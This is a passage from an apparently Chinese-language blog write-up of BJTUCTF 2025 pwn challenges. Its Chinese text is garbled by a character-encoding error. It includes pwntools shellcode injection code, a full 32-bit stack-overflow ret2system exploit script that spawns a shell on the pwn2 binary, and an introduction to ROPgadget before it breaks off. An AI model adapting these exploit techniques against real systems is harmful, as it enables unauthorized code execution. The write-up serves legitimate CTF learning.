</span></span><span class="line"><span class="cl"><span class="c1"># åˆ›å»ºä¸€ä¸ªè¿›ç¨‹å¯¹è±¡ï¼Œå¯åŠ¨æœ¬åœ°çš„pwn1ç¨‹åºï¼ˆå½“å‰ç›®å½•ä¸‹çš„å¯æ‰§è¡Œæ–‡ä»¶pwn1ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ç›¸å½“äºåœ¨ç»ˆç«¯ä¸­è¿è¡Œ./pwn1</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwn1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># å¦‚æœæ˜¯è¿œç¨‹è¿æ¥é¢˜ç›®æœåŠ¡å™¨ï¼Œå°±æ³¨é‡Šæ‰ä¸Šé¢çš„processï¼Œä½¿ç”¨ä¸‹é¢è¿™è¡Œ</span>
</span></span><span class="line"><span class="cl"><span class="c1"># io = remote(&#34;ip&#34;, port)  # &#34;ip&#34;æ˜¯æœåŠ¡å™¨åœ°å€ï¼Œportæ˜¯ç«¯å£å·ï¼Œæ¯”å¦‚remote(&#34;127.0.0.1&#34;, 10086)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ç”Ÿæˆä¸€ä¸ªè·å–shellçš„shellcodeï¼ˆæœºå™¨ç ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="c1"># shellcraft.sh()ï¼špwntoolså†…ç½®çš„ç”Ÿæˆ&#34;è·å–shäº¤äº’shell&#34;çš„æ±‡ç¼–ä»£ç </span>
</span></span><span class="line"><span class="cl"><span class="c1"># asm()ï¼šå°†æ±‡ç¼–ä»£ç è½¬æ¢ä¸ºæœºå™¨ç ï¼ˆå¯ç›´æ¥åœ¨CPUä¸Šæ‰§è¡Œçš„äºŒè¿›åˆ¶æŒ‡ä»¤ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># å‘ç¨‹åºå‘é€ç”Ÿæˆçš„shellcode</span>
</span></span><span class="line"><span class="cl"><span class="c1"># sendline()ï¼šå‘é€æ•°æ®åè‡ªåŠ¨æ·»åŠ æ¢è¡Œç¬¦ï¼Œç›¸å½“äºåœ¨ç»ˆç«¯è¾“å…¥å†…å®¹åæŒ‰å›è½¦</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ï¼ˆå¯é€‰ï¼‰æ¥æ”¶ç¨‹åºè¿”å›çš„å†…å®¹</span>
</span></span><span class="line"><span class="cl"><span class="c1"># io.recv() </span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># è¿›å…¥äº¤äº’æ¨¡å¼ï¼Œæ­¤æ—¶å¯ä»¥åƒæ“ä½œç»ˆç«¯ä¸€æ ·è¾“å…¥å‘½ä»¤ï¼ˆæ¯”å¦‚lsã€cat flagç­‰ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="c1"># å½“ç¨‹åºæˆåŠŸæ‰§è¡Œshellcodeåï¼Œä¼šè·å¾—ä¸€ä¸ªshellï¼Œé€šè¿‡è¿™é‡Œè¿›è¡Œäº¤äº’</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote class="alert alert-note">
    <blockquote>
<p>PWNçš„è§£é¢˜æ€è·¯å¤§è‡´ä¸ºï¼šchecksecæŒ‡ä»¤çœ‹ä¿æŠ¤ä¿¡æ¯â†’ä½¿ç”¨æ­£ç¡®çš„IDAå»åˆ†æåŠŸèƒ½å‡½æ•°â†’çœ‹æ±‡ç¼–ä»£ç å’ŒCè¯­è¨€ä¼ªä»£ç â†’å¯»æ‰¾æ¼æ´åŒ…æ‹¬åé—¨å‡½æ•°<code>system(&quot;/bin/sh&quot;);ã€execve(&quot;/bin/sh&quot;);ã€system(&quot;sh&quot;);</code>ç­‰â†’ç¼–å†™EXP</p>
<p>åœ¨æ­¤ä¹‹å‰éœ€è¦ç‰¹åˆ«æ³¨æ„çš„æ˜¯ç¨‹åºæ¶æ„ï¼Œæœ‰x86å’Œx64ï¼Œä¸¤ä¸ªæ¶æ„çš„å‚æ•°ä¼ é€’é¡ºåºã€å­—èŠ‚é•¿åº¦ã€è¿è¡Œæµç¨‹éƒ½æœ‰æ‰€å·®åˆ«ã€‚</p>
</blockquote></blockquote>
<h3 id="pwn2">pwn2
</h3><p><a class="link" href="pwn2" >pwn2</a></p>
<p>checksecä¸€ä¸‹çœ‹çœ‹ï¼š</p>
<p><img src="/p/2025bjtuctf-pwn/1.png"
	width="770"
	height="204"
	srcset="/p/2025bjtuctf-pwn/1_hu_248b3e39131caca2.png 480w, /p/2025bjtuctf-pwn/1_hu_e3783224f908bff7.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="377"
		data-flex-basis="905px"
	
></p>
<ul>
<li><strong>Arch</strong>ï¼šç¨‹åºæ¶æ„ä¸º <code>i386 - 32 - little</code>ï¼Œå³ 32 ä½å°ç«¯åºçš„ Intel x86 æ¶æ„ã€‚</li>
<li><strong>RELRO</strong>ï¼šå¼€å¯äº† <code>Partial RELRO</code>ï¼Œæ„å‘³ç€éƒ¨åˆ†é‡å®šä½åªè¯»ï¼Œæœ‰ä¸€å®šçš„é˜²é‡å®šå‘æ”»å‡»èƒ½åŠ›ï¼Œä½†ä¸æ˜¯å®Œå…¨çš„ã€‚</li>
<li><strong>Stack</strong>ï¼š<code>No canary found</code>ï¼Œè¡¨ç¤ºæ ˆä¸­æ²¡æœ‰å¯ç”¨æ ˆä¿æŠ¤ï¼ˆé‡‘ä¸é›€ï¼‰ï¼Œè¿™ä½¿å¾—æ ˆæº¢å‡ºæ”»å‡»æ›´å®¹æ˜“å®æ–½ã€‚</li>
<li><strong>NX</strong>ï¼š<code>NX enabled</code>ï¼Œè¡¨ç¤ºå¯ç”¨äº†ä¸å¯æ‰§è¡Œï¼ˆNo - eXecuteï¼‰ä¿æŠ¤ï¼Œå³æ ˆä¸Šçš„ä»£ç é»˜è®¤ä¸å¯æ‰§è¡Œï¼Œèƒ½é˜²èŒƒä¸€äº›åŸºäºæ ˆçš„ä»£ç æ³¨å…¥æ”»å‡»ã€‚</li>
<li><strong>PIE</strong>ï¼š<code>No PIE</code>ï¼Œå³æ²¡æœ‰å¯ç”¨åœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–ï¼ˆPosition - Independent Executableï¼‰ï¼Œç¨‹åºçš„å†…å­˜åœ°å€æ˜¯å›ºå®šçš„ï¼Œè¿™å¯¹åˆ©ç”¨å†…å­˜æ¼æ´ï¼ˆå¦‚ç¼“å†²åŒºæº¢å‡ºç­‰ï¼‰æœ‰å¸®åŠ©ï¼Œå› ä¸ºæ”»å‡»è€…å¯ä»¥é¢„å…ˆçŸ¥é“å…³é”®åœ°å€ã€‚</li>
</ul>
<p>IDA32ä½åˆ†æï¼š</p>
<p><img src="/p/2025bjtuctf-pwn/2.png"
	width="790"
	height="445"
	srcset="/p/2025bjtuctf-pwn/2_hu_1cd06e6a0749249f.png 480w, /p/2025bjtuctf-pwn/2_hu_24feb5a6be61221a.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="177"
		data-flex-basis="426px"
	
></p>
<p>åŒå‡»è·Ÿè¿›BJTUCTFå‡½æ•°ï¼š</p>
<p><img src="/p/2025bjtuctf-pwn/3.png"
	width="631"
	height="146"
	srcset="/p/2025bjtuctf-pwn/3_hu_c3c789a0989d116b.png 480w, /p/2025bjtuctf-pwn/3_hu_1893e2a93d6190af.png 1024w"
	loading="lazy"
	
		alt="BJTUCTFå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="432"
		data-flex-basis="1037px"
	
></p>
<p>ç°åœ¨å¼€å§‹è¯»Cè¯­è¨€ä»£ç äº†ï¼Œçœ‹çœ‹åœ¨è®²ä»€ä¹ˆï¼Œå®šä¹‰äº†å®¹é‡ä¸º18å¤§å°çš„bufæ•°ç»„ï¼Œç„¶åæœ‰ä¸€ä¸ªreadå‡½æ•°ï¼Œä¼šè¯»å–0x32å¤§å°åˆ°bufä¸Šã€‚ä¹ä¸€çœ‹å¾ˆæ­£å¸¸ï¼Œå…¶å®è¿™å·²ç»æ˜¯ä¸€ä¸ªæ¼æ´äº†ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å€ŸåŠ©readçš„ä½œç”¨ï¼Œä½¿ç¨‹åºå‘ç”Ÿæ ˆæº¢å‡ºï¼Œå¡«æ»¡äº†bufæ¥ç€æº¢å‡ºåï¼ŒæŠŠreturnå¯¹åº”çš„åœ°å€ç»™è¦†ç›–äº†ï¼Œè¿™æ—¶å€™returnä¼šæŒ‡å‘æˆ‘ä»¬è¦†ç›–çš„ä»£ç ï¼Œé‚£æˆ‘ä»¬å¯ä»¥è®¾è®¡æŠŠè¿™ä¸ªè¦†ç›–çš„ä»£ç å†™æˆè®¾è®¡å¥½çš„ä¸€ä¸ªåœ°å€ï¼Œè¿™æ ·returnè¿”å›åˆ°é‚£ä¸ªåœ°å€ï¼Œå»æ‰§è¡Œæˆ‘æƒ³è¦çš„æ•ˆæœã€‚</p>
<p>è¡Œï¼Œæœ¬é¢˜åŸºæœ¬æ€è·¯å·²è¾¾æˆï¼Œé‚£æˆ‘ä»¬æ‰¾æ‰¾æœ‰æ— å¯åˆ©ç”¨çš„ä¸œè¥¿ï¼Œåœ¨å·¦è¾¹çš„å‡½æ•°ç›®å½•ä¸Šçœ‹åˆ°äº†ä¸¤ä¸ªå‡½æ•°å¾ˆå¯ç–‘ï¼šhint &amp; SASCTF</p>
<p><img src="/p/2025bjtuctf-pwn/4.png"
	width="948"
	height="420"
	srcset="/p/2025bjtuctf-pwn/4_hu_7ee7435a6dacfa3c.png 480w, /p/2025bjtuctf-pwn/4_hu_7b035d6082ac66dc.png 1024w"
	loading="lazy"
	
		alt="SASCTFå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="225"
		data-flex-basis="541px"
	
></p>
<p><img src="/p/2025bjtuctf-pwn/5.png"
	width="976"
	height="450"
	srcset="/p/2025bjtuctf-pwn/5_hu_1ce838518cd9fdbe.png 480w, /p/2025bjtuctf-pwn/5_hu_4fb5067f95d98ce9.png 1024w"
	loading="lazy"
	
		alt="hintå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="216"
		data-flex-basis="520px"
	
></p>
<p>çœ‹åˆ°è¿™é‡Œå°±æƒ³ï¼Œæ ¹æœ¬ä¸æ˜¯<code>system(&quot;/bin/sh&quot;);</code>ï¼Œæ¯”è¾ƒç›¸ä¼¼æœ‰ä¸ªshå•Šï¼Œå…¶å®åœ¨å¼€ç¯‡é¢˜ç›®è¿è¡Œç¨‹åºæ—¶ï¼Œå°±å·²ç»æç¤ºè¿‡äº†ï¼Œè¿™é¢˜å°±æ˜¯è¦ç”¨shå»æ‹¿åå°ç¨‹åºçš„flagï¼Œæ²¡ç”¨å¸¸è§çš„åé—¨å‡½æ•°ï¼Œé‚£æˆ‘ä»¬å°±è‡ªå·±æ„å»ºä¸€ä¸ª&hellip;ã€‚</p>
<p>å…ˆæŠŠexpæ¡†æ¶æ­å‡ºæ¥ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = remote(&#39;ip&#39;,port)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwn2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">...</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å·®payloadï¼š</p>
<p>ä¸€å¼€å§‹å…ˆæŠŠç¼“å†²åŒºï¼ˆbufï¼‰å¡«æ»¡å…ˆï¼Œç”¨0x16ï¼Œå¾…ä¼šè¿˜è¦åŠ 4ï¼Œä¹Ÿå°±æ˜¯ï¼ˆ0x16+4ï¼‰ï¼Œä¸ºä»€ä¹ˆåŠ 4ï¼Ÿ</p>
<p>åœ¨ 32 ä½ç¨‹åºçš„å‡½æ•°è°ƒç”¨æ ˆå¸§ä¸­ï¼Œç»“æ„å¤§è‡´å¦‚ä¸‹ï¼ˆä»é«˜åœ°å€åˆ°ä½åœ°å€ï¼‰ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[è¿”å›åœ°å€]  â† å‡½æ•°æ‰§è¡Œç»“æŸåè¦è·³è½¬çš„åœ°å€ï¼ˆ4å­—èŠ‚ï¼‰
</span></span><span class="line"><span class="cl">[ebp]       â† ä¸Šä¸€å±‚æ ˆå¸§çš„åŸºå€æŒ‡é’ˆï¼ˆ4å­—èŠ‚ï¼‰
</span></span><span class="line"><span class="cl">[å±€éƒ¨å˜é‡]  â† åŒ…æ‹¬æˆ‘ä»¬è¦æº¢å‡ºçš„ç¼“å†²åŒºï¼ˆå¤§å°ä¸º0x16å­—èŠ‚ï¼‰
</span></span></code></pre></td></tr></table>
</div>
</div><p>å½“è¿›è¡Œç¼“å†²åŒºæº¢å‡ºæ—¶ï¼š</p>
<ol>
<li>é¦–å…ˆéœ€è¦å¡«å…… <code>0x16</code> å­—èŠ‚æ¥å¡«æ»¡æ•´ä¸ªç¼“å†²åŒºï¼ˆå±€éƒ¨å˜é‡åŒºåŸŸï¼‰</li>
<li>æ¥ç€éœ€è¦å†å¡«å…… <code>4</code> å­—èŠ‚æ¥è¦†ç›– <code>ebp</code>ï¼ˆå› ä¸º 32 ä½ç³»ç»Ÿä¸­ <code>ebp</code> æ˜¯ 4 å­—èŠ‚å¯„å­˜å™¨ï¼‰</li>
</ol>
<p>è¦†ç›– <code>ebp</code> æœ¬èº«å¯¹æ¼æ´åˆ©ç”¨é€šå¸¸æ²¡æœ‰ç›´æ¥ä½œç”¨ï¼Œä½†è¿™æ˜¯åˆ°è¾¾è¿”å›åœ°å€çš„å¿…ç»ä¹‹è·¯ â€”â€” åªæœ‰å…ˆè¦†ç›–æ‰ <code>ebp</code>ï¼Œåç»­çš„æ•°æ®æ‰èƒ½å†™å…¥åˆ°è¿”å›åœ°å€çš„ä½ç½®ã€‚</p>
<p>æ‰€ä»¥ <code>0x16+4</code> çš„å®Œæ•´å«ä¹‰æ˜¯ï¼š<code>0x16</code> å­—èŠ‚å¡«æ»¡ç¼“å†²åŒº + <code>4</code> å­—èŠ‚è¦†ç›– <code>ebp</code>ï¼Œä¹‹åå°±å¯ä»¥å¼€å§‹å†™å…¥æˆ‘ä»¬æƒ³è¦çš„è¿”å›åœ°å€ï¼ˆ<code>system</code> å‡½æ•°åœ°å€ï¼‰äº†ã€‚</p>
<p>systemå‡½æ•°ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// attributes: thunk
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">int</span> <span class="nf">system</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">command</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">system</span><span class="p">(</span><span class="n">command</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¯çŸ¥é“systemå‡½æ•°åªæœ‰ä¸€ä¸ªå˜é‡å‚æ•°è¦ä»£å…¥ã€‚æˆ‘ä»¬æ²¡æ‰¾åˆ°<code>/bin/sh</code>ï¼Œæ„é€ ä¸å‡º<code>system(&quot;/bin/sh&quot;);</code>ï¼Œä½†æˆ‘ä»¬å¯ä»¥æ„é€ å‡º<code>system(&quot;sh&quot;);</code></p>
<p>ç”¨Alt+Tæœå¯»shå­—ç¬¦ä¸²åœ°å€ï¼š</p>
<p><img src="/p/2025bjtuctf-pwn/6.png"
	width="1185"
	height="190"
	srcset="/p/2025bjtuctf-pwn/6_hu_35a2ded1cee12c7c.png 480w, /p/2025bjtuctf-pwn/6_hu_caadbd2d0e03d9a8.png 1024w"
	loading="lazy"
	
		alt="shçš„åœ°å€æ˜¯0x804A23D"
	
	
		class="gallery-image" 
		data-flex-grow="623"
		data-flex-basis="1496px"
	
></p>
<p>payloadï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">sh</span> <span class="o">=</span> <span class="mh">0x804A23D</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span><span class="n">cyclic</span><span class="p">(</span><span class="mh">0x16</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å…¶å®è¿™é‡Œçš„systemå‡½æ•°åœ°å€å¯ä»¥ç”¨IDAå»æ‰¾çš„ï¼Œæˆ‘è¿™é‡Œç”¨ELFå»æ‰¾ä¹Ÿè¡Œï¼Œæ›´æ–¹ä¾¿ã€‚</p>
<p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = remote(&#39;ip&#39;,port)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwn2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">sh</span> <span class="o">=</span> <span class="mh">0x804A23D</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span><span class="n">cyclic</span><span class="p">(</span><span class="mh">0x16</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="pwn3">pwn3
</h3><p><a class="link" href="pwn3" >pwn3</a></p>
<p>è¿™é¢˜æ¥åˆ°ä¸€ä¸ªROPgadgetçš„ä½¿ç”¨ï¼Œç»™å„ä½ç®€å•ä»‹ç»ä¸€ä¸‹ï¼š</p>
<p>ROPgadget æ˜¯ä¸€æ¬¾åœ¨äºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨é¢†åŸŸå¹¿æ³›ä½¿ç”¨çš„å·¥å…·ï¼Œä¸»è¦ç”¨äºå¯»æ‰¾å’Œåˆ†æäºŒè¿›åˆ¶æ–‡ä»¶ä¸­çš„è¿”å›å¯¼å‘ç¼–ç¨‹ï¼ˆReturn - Oriented Programmingï¼ŒROPï¼‰å°å·¥å…·ï¼ˆgadgetï¼‰ã€‚</p>
<blockquote class="alert alert-note">
    <blockquote>
<h4 id="ropgadgetåœ¨æ¼æ´åˆ©ç”¨ä¸­çš„ä½œç”¨">ROPgadgetåœ¨æ¼æ´åˆ©ç”¨ä¸­çš„ä½œç”¨
</h4><ul>
<li><strong>ç»•è¿‡é˜²å¾¡æœºåˆ¶</strong>ï¼šåœ¨ç°ä»£æ“ä½œç³»ç»Ÿä¸­ï¼Œå­˜åœ¨å¤šç§å†…å­˜ä¿æŠ¤æœºåˆ¶ï¼Œå¦‚æ ˆä¿æŠ¤ï¼ˆCanaryï¼‰ã€åœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–ï¼ˆASLRï¼‰ã€ä¸å¯æ‰§è¡Œæ ˆï¼ˆNXï¼‰ç­‰ã€‚ROP æŠ€æœ¯åˆ©ç”¨ç¨‹åºä¸­å·²æœ‰çš„ä»£ç ç‰‡æ®µï¼ˆROPgadgetï¼‰æ¥æ„å»ºæ–°çš„æ‰§è¡Œé€»è¾‘ï¼Œèƒ½å¤Ÿåœ¨ä¸æ‰§è¡Œæ”»å‡»è€…æ³¨å…¥çš„ä»£ç ï¼ˆç»•è¿‡ NX ä¿æŠ¤ï¼‰çš„æƒ…å†µä¸‹ï¼Œå®ç°ä»»æ„ä»£ç æ‰§è¡Œçš„æ•ˆæœã€‚ä¾‹å¦‚ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨ ROPgadget æ¥æ„å»ºç³»ç»Ÿè°ƒç”¨ï¼Œä»¥è·å– shellã€‚</li>
<li><strong>æ„é€ å¤æ‚æ”»å‡»é“¾</strong>ï¼šé€šè¿‡ç»„åˆä¸åŒåŠŸèƒ½çš„ ROPgadgetï¼Œæ”»å‡»è€…å¯ä»¥å®ç°ä¸€ç³»åˆ—å¤æ‚çš„æ“ä½œï¼Œå¦‚è®¾ç½®å‡½æ•°å‚æ•°ã€è°ƒç”¨ç‰¹å®šå‡½æ•°ç­‰ï¼Œä»è€Œå®Œæˆå¯¹ç›®æ ‡ç¨‹åºçš„æ”»å‡»ã€‚</li>
</ul>
<h4 id="å·¥ä½œåŸç†">å·¥ä½œåŸç†
</h4><ul>
<li><strong>æœºå™¨ç æ‰«æ</strong>ï¼šROPgadget ä¼šå¯¹äºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆå¦‚ ELFã€PE ç­‰æ ¼å¼ï¼‰è¿›è¡Œæ‰«æï¼Œå®ƒä¸æ˜¯åŸºäºé«˜çº§è¯­è¨€çš„è¯­æ³•æ¥åˆ†æï¼Œè€Œæ˜¯ç›´æ¥é’ˆå¯¹æœºå™¨ç ã€‚é€šè¿‡æœç´¢ç‰¹å®šçš„æŒ‡ä»¤åºåˆ—æ¨¡å¼ï¼Œæ‰¾åˆ°ä»¥ <code>ret</code> æŒ‡ä»¤ç»“å°¾çš„æŒ‡ä»¤ç‰‡æ®µï¼Œè¿™äº›ç‰‡æ®µå°±æ˜¯ ROPgadgetã€‚</li>
<li><strong>åœ°å€è§£æ</strong>ï¼šåœ¨æ‰¾åˆ° ROP å°å·¥å…·åï¼Œè¿˜ä¼šè§£æå‡ºå®ƒä»¬åœ¨äºŒè¿›åˆ¶æ–‡ä»¶ä¸­çš„è™šæ‹Ÿåœ°å€ï¼Œæ–¹ä¾¿åœ¨æ¼æ´åˆ©ç”¨ä»£ç ç¼–å†™æ—¶ä½¿ç”¨ã€‚</li>
</ul>
<h4 id="ä¸»è¦åŠŸèƒ½">ä¸»è¦åŠŸèƒ½
</h4><ul>
<li><strong>æŸ¥æ‰¾ ROPgadget</strong>ï¼šç”¨æˆ·å¯ä»¥æŒ‡å®šäºŒè¿›åˆ¶æ–‡ä»¶ï¼ŒROPgadget ä¼šåˆ—å‡ºæ–‡ä»¶ä¸­æ‰€æœ‰ç¬¦åˆæ¡ä»¶çš„ ROP å°å·¥å…·ã€‚ä¾‹å¦‚ï¼Œå®ƒå¯ä»¥æ‰¾åˆ°èƒ½å¤Ÿç”¨äºè®¾ç½®å¯„å­˜å™¨å€¼ã€æ‰§è¡Œç³»ç»Ÿè°ƒç”¨ç­‰åŠŸèƒ½çš„å°å·¥å…·ã€‚</li>
<li><strong>è¿‡æ»¤ä¸ç­›é€‰</strong>ï¼šæ”¯æŒæ ¹æ®ä¸åŒçš„æ¡ä»¶å¯¹ ROP å°å·¥å…·è¿›è¡Œè¿‡æ»¤ï¼Œæ¯”å¦‚æŒ‰ç…§æŒ‡ä»¤çš„å…·ä½“å†…å®¹ï¼ˆå¦‚å¯»æ‰¾åŒ…å«ç‰¹å®šå¯„å­˜å™¨æ“ä½œçš„ gadgetï¼‰ã€æ“ä½œæ•°çš„å€¼ç­‰è¿›è¡Œç­›é€‰ï¼Œå¸®åŠ©ä½¿ç”¨è€…æ›´ç²¾å‡†åœ°æ‰¾åˆ°éœ€è¦çš„å°å·¥å…·ã€‚</li>
</ul>
</blockquote></blockquote>
<p>è¯¦è§è¯·è¿›å…¥æˆ‘çš„æ–‡ç« ä¸­å­¦ä¹ <a class="link" href="https://expl0rer.top/p/pwn-2/#rop-%e5%89%8d%e4%bc%a0"  target="_blank" rel="noopener"
    >ROPå‰ä¼ </a>ã€<a class="link" href="https://expl0rer.top/p/pwn-2/#rop"  target="_blank" rel="noopener"
    >ROP++</a></p>
<h4 id="é¢˜è§£è¿‡ç¨‹">é¢˜è§£è¿‡ç¨‹
</h4><p>checksecï¼š</p>
<p><img src="/p/2025bjtuctf-pwn/7.png"
	width="875"
	height="200"
	srcset="/p/2025bjtuctf-pwn/7_hu_819e249a224a06de.png 480w, /p/2025bjtuctf-pwn/7_hu_e12f3806a427b212.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="437"
		data-flex-basis="1050px"
	
></p>
<p>IDA64ä½åˆ†æï¼š</p>
<p><img src="/p/2025bjtuctf-pwn/8.png"
